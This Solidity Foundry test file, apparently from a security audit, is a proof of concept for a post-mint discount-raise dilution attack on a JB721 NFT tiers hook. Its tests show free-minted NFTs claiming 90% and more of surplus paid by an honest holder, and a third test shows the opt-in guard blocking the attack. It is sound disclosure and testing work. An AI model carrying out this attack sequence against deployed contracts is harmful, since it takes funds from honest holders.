// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

// forge-lint: disable-next-line(unaliased-plain-import)
import "../utils/UnitTestSetup.sol";
import {JB721TierConfigFlags} from "../../src/structs/JB721TierConfigFlags.sol";

/// @title PostMintDiscountDilution
/// @notice Adversarial PoC for the post-mint discount-raise dilution attack.
/// @dev DISTINCT FROM F-721-N1, which only describes ADDING a new high-discount tier mid-cycle.
///      This PoC raises the `discountPercent` on an EXISTING tier (no `cantIncreaseDiscountPercent` set),
///      which is governed by the separate `SET_721_DISCOUNT_PERCENT` (id=27) permission — NOT
///      `ADJUST_721_TIERS` (id=24). The "lock adjustTiers when minted-supply>0" mitigation
///      proposed in F-721-N1 does NOT close this path.
///
///      Cashout weight per NFT is the tier's STORED price (uncapped by what was actually paid). When
///      the discount is raised post-mint, future mints contribute ~0 to surplus but still carry the
///      FULL price weight on cashout. Earlier (full-price) payers' share of the surplus is silently
///      diluted by the new free mints.
///
///      Note: tiers default to `cantIncreaseDiscountPercent = false`, so the door is open by default.
contract PostMintDiscountDilution is UnitTestSetup {
    using stdStorage for StdStorage;

    function _mockTerminalAuth() internal {
        mockAndExpect(
            mockJBDirectory,
            abi.encodeWithSelector(IJBDirectory.isTerminalOf.selector, projectId, mockTerminalAddress),
            abi.encode(true)
        );
    }

    function _buildPayContext(
        address targetHook,
        address payer,
        uint256 value,
        uint16[] memory tierIds
    )
        internal
        view
        returns (JBAfterPayRecordedContext memory)
    {
        bytes[] memory data = new bytes[](1);
        // First arg = "allowOverspending" (so leftover doesn't revert with Overspending).
        data[0] = abi.encode(true, tierIds);
        bytes4[] memory ids = new bytes4[](1);
        ids[0] = metadataHelper.getId("pay", targetHook);
        bytes memory hookMetadata = metadataHelper.createMetadata(ids, data);

        return JBAfterPayRecordedContext({
            payer: payer,
            projectId: projectId,
            rulesetId: 0,
            amount: JBTokenAmount({
                token: JBConstants.NATIVE_TOKEN,
                value: value,
                decimals: 18,
                currency: uint32(uint160(JBConstants.NATIVE_TOKEN))
            }),
            forwardedAmount: JBTokenAmount({
                token: JBConstants.NATIVE_TOKEN,
                value: 0,
                decimals: 18,
                currency: uint32(uint160(JBConstants.NATIVE_TOKEN))
            }),
            weight: 10 ** 18,
            newlyIssuedTokenCount: 0,
            beneficiary: payer,
            hookMetadata: bytes(""),
            payerMetadata: hookMetadata
        });
    }

    /// @notice Honest holder buys 1 NFT at full price 10. A malicious operator (with only
    ///         SET_721_DISCOUNT_PERCENT) then raises tier discount to 100% and a payer free-mints
    ///         9 more NFTs of the same tier. The free NFTs' cashout weight is 9x the honest holder's,
    ///         despite contributing 0 ETH to surplus.
    function test_PostMintDiscountRaise_DilutesExistingHolders() public {
        // --- Setup: default helper makes tier 1 price=10, supply=100, no discount.
        //     We must NOT set `cantIncreaseDiscountPercent` (it defaults to false).
        defaultTierConfig.reserveFrequency = 0;
        defaultTierConfig.reserveBeneficiary = address(0);
        defaultTierConfig.flags.useVotingUnits = false;
        defaultTierConfig.flags.cantIncreaseDiscountPercent = false;

        ForTest_JB721TiersHook targetHook = _initializeForTestHook(1);
        IJB721TiersHookStore hookStore = targetHook.STORE();

        _mockTerminalAuth();

        // --- Honest holder pays full 10 for 1 NFT of tier 1.
        address honest = makeAddr("honest");
        uint16[] memory tierIds = new uint16[](1);
        tierIds[0] = 1;
        JBAfterPayRecordedContext memory honestCtx = _buildPayContext(address(targetHook), honest, 10, tierIds);
        vm.prank(mockTerminalAddress);
        targetHook.afterPayRecordedWith(honestCtx);

        assertEq(targetHook.balanceOf(honest), 1, "honest holds 1 NFT");
        uint256 totalWeightBefore = hookStore.totalCashOutWeightOf(address(targetHook));
        assertEq(totalWeightBefore, 10, "total cashout weight after honest = 10");

        // --- Operator (with only SET_721_DISCOUNT_PERCENT) raises discount to 100%.
        //     F-721-N1's proposed "lock adjustTiers" fix does NOT help here — adjustTiers is never called.
        vm.mockCall(mockJBPermissions, abi.encodeWithSelector(IJBPermissions.hasPermission.selector), abi.encode(true));
        vm.prank(owner);
        targetHook.setDiscountPercentOf(1, 200); // DISCOUNT_DENOMINATOR = 200 -> 100% off, free mint.

        // --- Attacker free-mints 9 NFTs (effective price 0 each).
        address attacker = makeAddr("attacker");
        uint16[] memory bulkTierIds = new uint16[](9);
        for (uint256 i; i < 9; i++) bulkTierIds[i] = 1;
        JBAfterPayRecordedContext memory atkCtx = _buildPayContext(address(targetHook), attacker, 0, bulkTierIds);
        vm.prank(mockTerminalAddress);
        targetHook.afterPayRecordedWith(atkCtx);

        assertEq(targetHook.balanceOf(attacker), 9, "attacker holds 9 free NFTs");

        // --- The attack: cashout weight per NFT is STORED price (10), regardless of price paid.
        uint256[] memory honestTokens = new uint256[](1);
        honestTokens[0] = 1_000_000_001; // tier 1, token #1 (first mint generates `initialSupply - --remainingSupply` = 100 - 99 = 1)

        uint256[] memory attackerTokens = new uint256[](9);
        for (uint256 i; i < 9; i++) attackerTokens[i] = 1_000_000_002 + i; // sequential after honest

        uint256 honestWeight = hookStore.cashOutWeightOf(address(targetHook), honestTokens);
        uint256 attackerWeight = hookStore.cashOutWeightOf(address(targetHook), attackerTokens);
        uint256 totalWeight = hookStore.totalCashOutWeightOf(address(targetHook));

        assertEq(honestWeight, 10, "honest weight = his original price (10)");
        assertEq(attackerWeight, 90, "attacker weight = 9 * 10 = 90 (price NOT discounted in weight)");
        assertEq(totalWeight, 100, "total weight = 100");

        // Project surplus contributed: only honest's 10 ETH. Attacker takes 90% of it on cashout.
        assertEq(attackerWeight * 100 / totalWeight, 90, "attacker would reclaim 90% of surplus");
        assertEq(honestWeight * 100 / totalWeight, 10, "honest reclaims only 10% of his own payment");

        emit log_named_uint("Honest paid (wei units)", 10);
        emit log_named_uint("Attacker paid (wei units)", 0);
        emit log_named_uint("Attacker share of surplus (percent)", attackerWeight * 100 / totalWeight);
    }

    /// @notice Same attack via `setDiscountPercentsOf` (batch).
    function test_PostMintDiscountRaise_BatchPath() public {
        defaultTierConfig.reserveFrequency = 0;
        defaultTierConfig.reserveBeneficiary = address(0);
        defaultTierConfig.flags.useVotingUnits = false;
        defaultTierConfig.flags.cantIncreaseDiscountPercent = false;

        ForTest_JB721TiersHook targetHook = _initializeForTestHook(2);
        IJB721TiersHookStore hookStore = targetHook.STORE();

        _mockTerminalAuth();

        // Honest mints 1 from tier 1 (price 10).
        address honest = makeAddr("honest");
        uint16[] memory tierIds = new uint16[](1);
        tierIds[0] = 1;
        JBAfterPayRecordedContext memory ctx = _buildPayContext(address(targetHook), honest, 10, tierIds);
        vm.prank(mockTerminalAddress);
        targetHook.afterPayRecordedWith(ctx);

        // Operator flips BOTH tiers to 100% discount.
        vm.mockCall(mockJBPermissions, abi.encodeWithSelector(IJBPermissions.hasPermission.selector), abi.encode(true));
        JB721TiersSetDiscountPercentConfig[] memory configs = new JB721TiersSetDiscountPercentConfig[](2);
        configs[0] = JB721TiersSetDiscountPercentConfig({tierId: 1, discountPercent: 200});
        configs[1] = JB721TiersSetDiscountPercentConfig({tierId: 2, discountPercent: 200});
        vm.prank(owner);
        targetHook.setDiscountPercentsOf(configs);

        // Verify stored price is unchanged, discount maxed.
        (uint104 p1,, uint8 d1) = hookStore.tierPricingOf(address(targetHook), 1);
        (uint104 p2,, uint8 d2) = hookStore.tierPricingOf(address(targetHook), 2);
        assertEq(p1, 10, "tier 1 stored price unchanged");
        assertEq(d1, 200, "tier 1 discount maxed");
        assertEq(p2, 20, "tier 2 stored price unchanged");
        assertEq(d2, 200, "tier 2 discount maxed");

        // Attacker free-mints 50 from tier 2 (stored price 20).
        address attacker = makeAddr("attacker");
        uint16[] memory atkTiers = new uint16[](50);
        for (uint256 i; i < 50; i++) atkTiers[i] = 2;
        JBAfterPayRecordedContext memory atkCtx = _buildPayContext(address(targetHook), attacker, 0, atkTiers);
        vm.prank(mockTerminalAddress);
        targetHook.afterPayRecordedWith(atkCtx);

        // Total weight: honest's 10 + attacker's 50*20 = 1010.
        uint256 totalWeight = hookStore.totalCashOutWeightOf(address(targetHook));
        assertEq(totalWeight, 10 + 50 * 20, "total weight = 1010");

        // Honest's recovery share collapses to <1%.
        uint256 honestShareBp = 10 * 10000 / totalWeight;
        emit log_named_uint("Honest recovery share (basis points)", honestShareBp);
        assertLt(honestShareBp, 100, "honest recovers <1% of total weight");
    }

    /// @notice Sanity check: with `cantIncreaseDiscountPercent = true` the attack is blocked.
    ///         This confirms the existing guard works -- the bug is that it's OPT-IN and false by default.
    function test_CantIncreaseDiscountPercent_Blocks_Attack() public {
        defaultTierConfig.reserveFrequency = 0;
        defaultTierConfig.reserveBeneficiary = address(0);
        defaultTierConfig.flags.useVotingUnits = false;
        defaultTierConfig.flags.cantIncreaseDiscountPercent = true; // guard ON

        ForTest_JB721TiersHook targetHook = _initializeForTestHook(1);

        vm.mockCall(mockJBPermissions, abi.encodeWithSelector(IJBPermissions.hasPermission.selector), abi.encode(true));

        vm.prank(owner);
        vm.expectRevert();
        targetHook.setDiscountPercentOf(1, 200);
    }
}
